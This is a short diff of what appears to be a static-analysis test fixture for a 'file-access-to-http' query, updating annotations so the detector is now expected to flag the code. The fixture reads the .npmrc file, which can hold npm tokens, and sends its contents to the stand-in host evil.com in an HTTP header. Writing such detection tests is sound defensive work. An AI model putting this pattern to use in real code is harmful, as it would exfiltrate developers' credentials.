@@ -13,14 +13,14 @@ const fsp = require("fs").promises;
 
 (async function sendRequest() {
   try {
-    const content = await fsp.readFile(".npmrc", "utf8"); // $ MISSING: Source[js/file-access-to-http]
+    const content = await fsp.readFile(".npmrc", "utf8"); // $ Source[js/file-access-to-http]
 
     https.get({
       hostname: "evil.com",
       path: "/upload",
       method: "GET",
       headers: { Referer: content }
-    }, () => { }); // $ MISSING: Alert[js/file-access-to-http]
+    }, () => { }); // $ Alert[js/file-access-to-http]
 
   } catch (error) {
     console.error("Error reading file:", error);
